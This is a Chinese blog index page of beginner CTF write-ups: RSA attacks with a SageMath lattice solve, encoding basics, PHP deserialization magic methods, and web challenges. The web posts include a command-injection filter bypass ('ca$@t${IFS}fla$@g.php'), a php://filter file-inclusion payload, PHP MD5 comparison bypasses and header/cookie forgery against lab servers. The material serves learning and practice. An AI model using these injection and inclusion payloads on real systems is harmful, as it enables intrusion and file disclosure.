<h2 id="查看n的素因子"><a href="#查看n的素因子" class="headerlink" title="查看n的素因子"></a>查看n的素因子</h2><p>遇到了一个N， 可以先去<a target="_blank" rel="noopener" href="http://factordb.com/index.php">factordb.com</a>查看一下N的素因子是否曾被记录，若可被完全分解，知道了p和q，那么问题就迎刃而解了</p>
<h2 id="小公钥指数攻击："><a href="#小公钥指数攻击：" class="headerlink" title="小公钥指数攻击："></a>小公钥指数攻击：</h2><h3 id="e-1"><a href="#e-1" class="headerlink" title="e=1"></a>e=1</h3><p>由于gmpy2.invert(1, k)对于任意的 K， 得到的结果都为 1</p>
<p>则我们可以直接print(long_to_bytes(pow(c, 1, n)))得到结果</p>
<h3 id="e很小，且c-远远小于-n"><a href="#e很小，且c-远远小于-n" class="headerlink" title="e很小，且c 远远小于 n"></a>e很小，且c 远远小于 n</h3><p> 即说明 flag ** e = c, 可推出结果</p>
<h2 id="低解密指数攻击："><a href="#低解密指数攻击：" class="headerlink" title="低解密指数攻击："></a>低解密指数攻击：</h2><h3 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h3><p><strong>在RSA中d也称为解密指数，当d比较小的时候，e也就显得特别大了。</strong></p>
<p><strong>适用情况：e过大或过小（一般e过大时使用）</strong></p>
<p>可以使用附件RSA工具里的rsa-wiener-attack-master</p>
<p>在 d 比较小（d &lt; 1/3 * N ** 1 / 4）时，攻击者可以使用 <strong>Wiener’s Attack</strong> 来获得私钥。</p>
<h3 id="Boneh-attack"><a href="#Boneh-attack" class="headerlink" title="Boneh attack"></a>Boneh attack</h3><p><img src="/2021/10/04/easyRSA/image-20211008225355445.png" alt="image-20211008225355445"></p>
<p><img src="/2021/10/04/easyRSA/image-20211008225643406.png" alt="image-20211008225643406"></p>
<p>由于公钥e的选取和 φ(N)的大小差不多，所以k的大小和d的大小差不多，于是有</p>
<p><img src="/2021/10/04/easyRSA/image-20211008225759836.png" alt="image-20211008225759836"></p>
<p><img src="/2021/10/04/easyRSA/image-20211008230006142.png" alt="image-20211008230006142"></p>
<p>Then the vector <img src="/2021/10/04/easyRSA/image-20211008230033466.png" alt="image-20211008230033466">is a short vector of the lattice, under the assumption that <em>d</em> is very low. Applying a lattice reduction (see the CryptoHack challenge <a target="_blank" rel="noopener" href="https://cryptohack.org/challenges/maths/">Gaussian Reduction</a> to implement it yourself, or use LLL), this vector can be found, and <em>d</em> can be extracted from its second coordinate.</p>
<p>下面是使用 SageMath version 9.1的题解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9</span><br><span class="line">e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d</span><br><span class="line">c = 0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac</span><br><span class="line">s = floor(sqrt(N))</span><br><span class="line">M = Matrix([[e, s], [N, 0]])</span><br><span class="line">Mred = M.LLL()</span><br><span class="line">D = [abs(Mred[i, 1]) // s for i in [0,1]]</span><br><span class="line">for d in D:</span><br><span class="line">    t = randint(2, N - 2)</span><br><span class="line">    tt = pow(t, e, N)</span><br><span class="line">    if tt^d != t:</span><br><span class="line">        continue</span><br><span class="line">    flag = int(pow(c, d, N))</span><br><span class="line">    flag = flag.to_bytes((flag.bit_length() + 7)//8, &#x27;big&#x27;)</span><br><span class="line">    print(f&#x27;FLAG: &#123;flag.decode()&#125;&#x27;)</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-crypto入门小知识" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/03/crypto%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="article-date">
      <time datetime="2021-10-03T11:58:49.000Z" itemprop="datePublished">2021-10-03</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/03/crypto%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/">crypto入门小知识</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="crypto加密类型简介"><a href="#crypto加密类型简介" class="headerlink" title="crypto加密类型简介"></a>crypto加密类型简介</h2><h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><blockquote>
<p>ASCII is a 7-bit encoding standard which allows the representation of text using the integers 0-127.</p>
</blockquote>
<p>我们可以通过python的chr和ord对其在ASCII和密钥之间转化</p>
<h3 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h3><blockquote>
<p>对于一串16进制编码，it is something more user-friendly and portable across different systems.</p>
</blockquote>
<p>我们可以通过bytes.fromhex()和hex()对其在HEX和密钥之间转化</p>
<h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><blockquote>
<p> One character of a Base64 string encodes 6 bits, and so 4 characters of Base64 encode three 8-bit bytes.</p>
</blockquote>
<p>python输入指令前需要import base64</p>
<p>我们可以通过base64.b64encode()和base64.b64decode()之间转化</p>
<h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>给出一串 72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf</p>
<p>先对其进行bytes.fromhex()转化，得到</p>
<p>b’r\xbc\xa9\xb6\x8f\xc1j\xc7\xbe\xeb\x8f\x84\x9d\xca\x1d\x8ax&gt;\x8a\xcf\x96y\xbf\x92i\xf7\xbf’</p>
<p>再输入base64.b64encode()</p>
<p>得到最终的flag为 b’crypto/Base+64+Encoding+is+Web+Safe/‘</p>
<h3 id="Bytes-and-Big-Integers"><a href="#Bytes-and-Big-Integers" class="headerlink" title="Bytes and Big Integers"></a>Bytes and Big Integers</h3><p><img src="/2021/10/03/crypto%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211003202156335.png" alt="image-20211003202156335"></p>
<p>对于RSA加密，习惯上先对一段密文进行bytes_to_long()加密，得到一串数字</p>
<p>python使用指令前需要from Crypto.Util.number import *</p>
<p>我们通过long_to_bytes()和bytes_to_long()在数字和密钥之间转化</p>
<h3 id="XOR-Starter"><a href="#XOR-Starter" class="headerlink" title="XOR Starter"></a>XOR Starter</h3><blockquote>
<p>For longer binary numbers we XOR bit by bit</p>
</blockquote>
<p>我们可以通过首先将每个字符转换为代表 Unicode 字符的整数来 XOR 字符串</p>
<p>XOR在python中表示为 ^</p>
<p>下图为XOR的几条运算律</p>
<p><img src="/2021/10/03/crypto%E5%85%A5%E9%97%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211003225400497.png" alt="image-20211003225400497"></p>
<h3 id="Quadratic-Residues"><a href="#Quadratic-Residues" class="headerlink" title="Quadratic Residues"></a>Quadratic Residues</h3><blockquote>
<p>We say that an integer <code>x</code> is a <em>Quadratic Residue</em> if there exists an <code>a</code> such that <code>a2 = x mod p</code>. If there is no such solution, then the integer is a <em>Quadratic Non-Residue</em>.</p>
</blockquote>
<blockquote>
<p>If <code>a2 = x</code> then (-a)2 = x. So if <code>x</code> is a quadratic residue in some finite field, then there are always two solutions for <code>a</code>.</p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
      <time datetime="2021-10-02T03:39:03.000Z" itemprop="datePublished">2021-10-02</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="eeeeeeeeeeezunserialize"><a href="#eeeeeeeeeeezunserialize" class="headerlink" title="eeeeeeeeeeezunserialize"></a>eeeeeeeeeeezunserialize</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211002114245428.png" alt="image-20211002114245428"></p>
<h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><h4 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h4><h5 id="1-constuct-构造函数"><a href="#1-constuct-构造函数" class="headerlink" title="1.constuct()构造函数"></a>1.constuct()构造函数</h5><p>通常实例化完一个对象之后，都要对该对象的属性进行初始化！在实例化一个对象的时候，PHP系统会自动的调用一个名字叫作construct()的方法，我们把这个方法叫作“构造方法”！</p>
<p>其中，构造方法可以没有参数！</p>
<h5 id="2-destruct-析构方法"><a href="#2-destruct-析构方法" class="headerlink" title="2.destruct()析构方法"></a>2.destruct()析构方法</h5><p>与构造方法是一对，构造方法是在一个对象“出生”的时候由系统自动调用的，而析构方法是在一个对象“消失”的时候由系统自动调用的！</p>
<p>析构方法的名字叫destruct()；注意里面不能有任何的参数！</p>
<h5 id="3-clone-克隆"><a href="#3-clone-克隆" class="headerlink" title="3.clone()克隆"></a>3.clone()克隆</h5><p>触发时机：是在克隆一个对象的时候，对新对象进行初始化的工作</p>
<h5 id="4-autoload-自动加载类"><a href="#4-autoload-自动加载类" class="headerlink" title="4.autoload()自动加载类"></a>4.autoload()自动加载类</h5><p>当调用不存在的类的时候自动调用！</p>
<h5 id="5-tostring"><a href="#5-tostring" class="headerlink" title="5.tostring()"></a>5.tostring()</h5><p>当将对象当成字符串使用的时候自动调用</p>
<h5 id="6-invoke"><a href="#6-invoke" class="headerlink" title="6.invoke()"></a>6.invoke()</h5><p>当将对象当成函数使用的时候自动调用</p>
<h5 id="7-set"><a href="#7-set" class="headerlink" title="7,set()"></a>7,set()</h5><p>当对无法访问的属性赋值时自动调用（比如：类外调用私有属性）</p>
<h5 id="8-get"><a href="#8-get" class="headerlink" title="8.get()"></a>8.get()</h5><p>当对获取无法访问的属性值的时候自动调用</p>
<h5 id="9-unset"><a href="#9-unset" class="headerlink" title="9.unset()"></a>9.unset()</h5><p>当销毁无法访问的属性的时候自动调用</p>
<h5 id="10-isset"><a href="#10-isset" class="headerlink" title="10.isset()"></a>10.isset()</h5><p>当判断无法访问的属性是否存在的时候自动调用</p>
<h5 id="11-call"><a href="#11-call" class="headerlink" title="11.call()"></a>11.call()</h5><p>当调用无法访问的普通方法时自动触发</p>
<h5 id="12-callststic"><a href="#12-callststic" class="headerlink" title="12.callststic()"></a>12.callststic()</h5><p>当无法通过静态方法访问时自动触发</p>
<h5 id="13-sleep"><a href="#13-sleep" class="headerlink" title="13.__sleep()"></a>13.__sleep()</h5><p>执行serialize()时，先会调用这个函数</p>
<h5 id="14-wakeup"><a href="#14-wakeup" class="headerlink" title="14.__wakeup()"></a>14.__wakeup()</h5><p>执行unserialize()时，先会调用这个函数</p>
<h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-babeRCE" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/01/babeRCE/" class="article-date">
      <time datetime="2021-10-01T15:46:39.000Z" itemprop="datePublished">2021-10-01</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/01/babeRCE/">babeRCE</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a>babeRCE</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/2021/10/01/babeRCE/image-20211001235119791.png" alt="image-20211001235119791"></p>
<p>解题思路</p>
<p>输入  47.93.215.154:5000/?rce=ls  可以得到   flag.php index.php</p>
<p>目标就是实现指令cat flag.php 不过需要绕开指令检测</p>
<p>在指令中穿插 \ 或 $@ 即可绕开， ${IFS} 可以代替空格</p>
<p><code>http://47.93.215.154:5000/?rce=ca$@t$&#123;IFS&#125;fla$@g.php</code></p>
<p><code>http://47.93.215.154:5000/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p>
<p>其他的还有待补充</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-几道web题" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/" class="article-date">
      <time datetime="2021-10-01T11:13:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/">几道web题</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001191433709.png" alt="image-20211001191433709"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001191507747.png" alt="image-20211001191507747"></p>
<p>打开网页后是一个如图所示的小游戏，几番折腾后游戏结束</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001191642280.png" alt="image-20211001191642280"></p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001191653895.png" alt="image-20211001191653895"></p>
<p>我们按F12查看源码，搜索flag和score相关关键词，发现了一个函数，即为解体的关键</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001194930314.png" alt="image-20211001194930314"></p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001191908626.png" alt="image-20211001191908626"></p>
<p>当游戏失败时，调用obj.getFlag，并对其中obj.score的数值进行判断，仅当score&gt;50001时才给出flag</p>
<h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>在F12的控制台中输入</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001195606298.png" alt="image-20211001195606298"></p>
<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>打开网址47.93.215.154:5001/flag.php?score=50001即可得到flag</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001195557547.png" alt="image-20211001195557547"></p>
<h2 id="Web-Inc"><a href="#Web-Inc" class="headerlink" title="Web_Inc"></a>Web_Inc</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001195843736.png" alt="image-20211001195843736"></p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>变量a通过get传参，变量b通过post传参</p>
<p>题中对a和b的值和MD5进行比较，当且仅当值不等且MD5相等时给出flag</p>
<h4 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h4><h5 id="等号的数量问题："><a href="#等号的数量问题：" class="headerlink" title="等号的数量问题："></a>等号的数量问题：</h5><p>三个等号 为 类型相等 并且 值相等</p>
<p>两个等号 仅仅为 值相等</p>
<p><strong>(若字符串以数字开头，则取开头数字作为转换结果，若无则输出0)</strong></p>
<p>“abc” == 0  值为 True</p>
<h5 id="MD5碰撞及绕过："><a href="#MD5碰撞及绕过：" class="headerlink" title="MD5碰撞及绕过："></a>MD5碰撞及绕过：</h5><h6 id="1、构造数组"><a href="#1、构造数组" class="headerlink" title="1、构造数组"></a>1、构造数组</h6><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
<p>$a = $GET[“a”]; $b = $GET[“b”];时可以构造<strong>a[]=1&amp;&amp;b[]=1</strong></p>
<h6 id="2、构造0E（仅适用于”-“）"><a href="#2、构造0E（仅适用于”-“）" class="headerlink" title="2、构造0E（仅适用于”==“）"></a>2、构造0E（仅适用于”==“）</h6><p>如果md5的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001211508144.png" alt="image-20211001211508144"></p>
<p>得到FLAG</p>
<h2 id="ezinclude（我们仍未知道那天所解的题的解法）"><a href="#ezinclude（我们仍未知道那天所解的题的解法）" class="headerlink" title="ezinclude（我们仍未知道那天所解的题的解法）"></a>ezinclude<em><strong>（我们仍未知道那天所解的题的解法）</strong></em></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211001225145844.png" alt="image-20211001225145844"></p>
<h3 id="题解（尚未知晓原理，以后补充）"><a href="#题解（尚未知晓原理，以后补充）" class="headerlink" title="题解（尚未知晓原理，以后补充）"></a>题解（尚未知晓原理，以后补充）</h3><p><em><strong>47.98.215.112:5000/?file=php://filter/convert.base64-encode/resource=flag.php</strong></em></p>
<p>得到PD8kZmxhZz0ibW9lY3Rme3hkc2VjNmFzZGdhczdhaGZzZmF4Y3pjfSI7Pz4=</p>
<p>利用base64解码得到<?$flag="moectf{xdsec6asdgas7ahfsfaxczc}";?></p>
<h2 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP?"></a>Do you know HTTP?</h2><p>打开网页几个大字赫然在目</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211002110958776.png" alt="image-20211002110958776"></p>
<p>借鉴之前小饼干的经验，该题应该是想要让我们伪造请求方式和各种的请求头来解题</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211002112048169.png" alt="image-20211002112048169"></p>
<p>伪造请求头 X-Forwarded-For： 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP。</p>
<p> 请求头格式：X-Forwarded-For: client, proxy1, proxy2 client</p>
<p>即客户端真实 ip，后两项是代理 ip，可缺省，最终在服务端接收前都会被补齐。</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211002112323207.png" alt="image-20211002112323207"></p>
<p>伪造请求头Referer可以伪造来源地址</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211002112704997.png" alt="image-20211002112704997"></p>
<p>User-Agent代表的是浏览服务器，只需要把值更改为LT即可</p>
<p><img src="/2021/10/01/%E5%87%A0%E9%81%93web%E9%A2%98/image-20211002113354175.png" alt="image-20211002113354175"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-web方向入门" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/" class="article-date">
      <time datetime="2021-10-01T04:54:23.000Z" itemprop="datePublished">2021-10-01</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/">web方向入门</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Web安全入门指北—GET"><a href="#Web安全入门指北—GET" class="headerlink" title="Web安全入门指北—GET"></a>Web安全入门指北—GET</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/get.png"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>变量$moe通过get的方式传参，并且当变量$moe == ’flag‘时给出flag</p>
<p>题目给出的网址为47.93.215.154:10000，只需要在后面加上?moe=flag即可</p>
<p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/image-20211001132028841.png" alt="image-20211001132028841"></p>
<p>或者可以使用postman工具，在params传参。</p>
<p>Params：参数。会直接出现在 url 中，一般为 GET 请求的参数。</p>
<h2 id="Web安全入门指北—POST"><a href="#Web安全入门指北—POST" class="headerlink" title="Web安全入门指北—POST"></a>Web安全入门指北—POST</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/post.png"></p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>浏览器一般使用get方法，对于post则需要使用一些工具，如postman。</p>
<p>在post中Key填入moe，Value填入flag，点击Send即可。</p>
<p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/image-20211001132109749.png" alt="image-20211001132109749"></p>
<p>Body：请求体。分表单提交、文件提交、JSON提交等多种方式</p>
<p>form-data：表单提交。相当于 html 的 form 标签中 multipart/form-data。可以上传文件、键值对等<br>x-www-form-urlencoded：表单提交。相当于 html 中 form 标签中 application/x-www-from-urlencoded。上传表单时会自动转换为键值对提交。<br>raw：文本提交。可以选择 XML、JSON、TEXT、HTML 等。<br>binary：二进制文件提交。通常用来上传文件、图片等。</p>
<h2 id="Web安全入门指北—小饼干"><a href="#Web安全入门指北—小饼干" class="headerlink" title="Web安全入门指北—小饼干"></a>Web安全入门指北—小饼干</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/image-20211001132514014.png" alt="image-20211001132514014"></p>
<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目表述为小饼干，即cookie。</p>
<p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/image-20211001133212230.png" alt="image-20211001133212230"></p>
<p>在网络项请求标头中发现了Cookie: VIP=0，则指需要构造HEADER中KEY=Cookie，VALUE=VIP=1，即可得到flag。</p>
<p><img src="/2021/10/01/web%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8/image-20211001133532510.png" alt="image-20211001133532510"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 John Doe
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
